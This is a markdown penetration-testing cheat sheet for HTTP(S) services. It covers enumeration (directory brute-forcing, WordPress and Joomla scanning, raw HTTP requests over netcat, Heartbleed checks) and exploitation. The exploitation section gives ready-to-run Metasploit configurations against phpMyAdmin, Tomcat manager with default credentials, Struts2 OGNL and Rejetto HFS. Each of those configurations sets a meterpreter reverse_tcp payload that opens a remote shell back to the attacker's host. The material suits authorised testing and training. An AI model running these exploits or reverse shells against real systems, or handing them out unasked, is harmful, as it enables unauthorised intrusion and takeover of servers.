# HTTP(S)

## Enumeration
- [ ] inspect HTML code
- [ ] add the mapping between IP and hostname into the attacker machine host file.
	- [ ] access the webpage through the IP address over both port 80 and 443. 
	- [ ] access the webpage through the host name over both port 80 and 443. 
		• If they both result in the same page, then there is no hostname-based routing applicable.
- [ ] access port 80 over HTTP and HTTPS protocols. 
- [ ] access port 443 over HTTP and HTTPS protocols
- [ ] append /index.html and /index.php address.
	• If index.html resolves but index.php doesn't, then the website likely doesn't support PHP.
- [ ] check robots.txt

#### Heartbleed
	• OpenSSL 1.0.1 through 1.0.1f are vulnerable.
	• OpenSSL 1.0.1g is NOT vulnerable.
	• OpenSSL 1.0.0 is NOT vulnerable.
	• OpenSSL 0.9.8 is NOT vulnerable.
##### sslscan
```bash
sslscan [IP]:443
```

##### nmap
```bash
nmap -sV --script=ssl-heartbleed [IP]
```

##### sslyze
```bash
sslyze -h [IP] --heartbleed
```


### Web Directories
##### gobuster
```bash
gobuster dir -u http[s]://[IP]/[PATH] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gobuster-results.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp"
```

feroxbuster
```bash
feroxbuster -u http[s]://[IP]/[PATH] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o feroxbuster-results.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" -k --status-codes 200,204,301,302,307,401,403 --extensions txt,html,php,asp,aspx,jsp
```

### CMS

#### CMS Explorer
```bash
cms-explorer -url http://[IP] -type [Drupal, WordPress, Joomla, Mambo]
```

#### wpscan

##### Vulnerable Plugins
```bash
wpscan --url http://[IP] --enumerate vp 
```

##### Vulnerable Themes
```bash
wpscan --url http://[IP] --enumerate vt
```

##### Users
```bash
wpscan --url http://[IP] --enumerate u
```

#### Joomscan
```bash
joomscan -u http://[IP] --enumerate-components
```


### Netcat
```bash
nc [IP] [port]
```

##### HEAD Request
```bash
HEAD / HTTP/1.0
Host: [IP]

```

##### OPTIONS Request
```bash
OPTIONS / HTTP/1.0
Host: [IP]

```

##### PROPFIND Request
```bash
PROPFIND / HTTP/1.0
Host: [IP]
Depth: 1

```

##### TRACE Request
```bash
TRACE / HTTP/1.1
Host: [IP]

```

##### PUT Request
```bash
PUT /test.txt HTTP/1.1
Host: [IP]
Content-Length: 11

Hello World
```

##### POST Request
```bash
POST /login.php HTTP/1.1
Host: [IP]
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

user=admin
```


### Metasploit

##### wordpress_login_enum
```bash
use scanner/http/wordpress_login_enum
set RHOSTS [IP]
set TARGETURI /wp-login.php
run
```

##### dir_scanner
```bash
use scanner/http/dir_scanner
set RHOSTS [IP]
set TARGETURI /
set PATHS /admin/,/login/,/backup/
run
```

##### http/ssl
```bash
use scanner/http/ssl
set RHOSTS [IP]
set RPORT 443
run
```

##### cms_ident
```bash
use scanner/http/cms_ident
set RHOSTS [IP]
set TARGETURI /
run
```


---
---


## Exploitation

### Metasploit

##### phpmyadmin_preg_replace
```bash
use exploit/unix/webapp/phpmyadmin_preg_replace
set RHOSTS [IP]
set TARGETURI /phpmyadmin/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST [IP]
run
```

##### tomcat_mgr_upload
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS [IP]
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
set TARGETURI /manager/html
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST [IP]
run
```

##### struts2_content_type_ognl
```bash
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS [IP]
set TARGETURI /struts2-showcase/index.action
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST [IP]
run
```

##### rejetto_hfs_exec
```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS [IP]
set RPORT 80
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [IP]
run
```
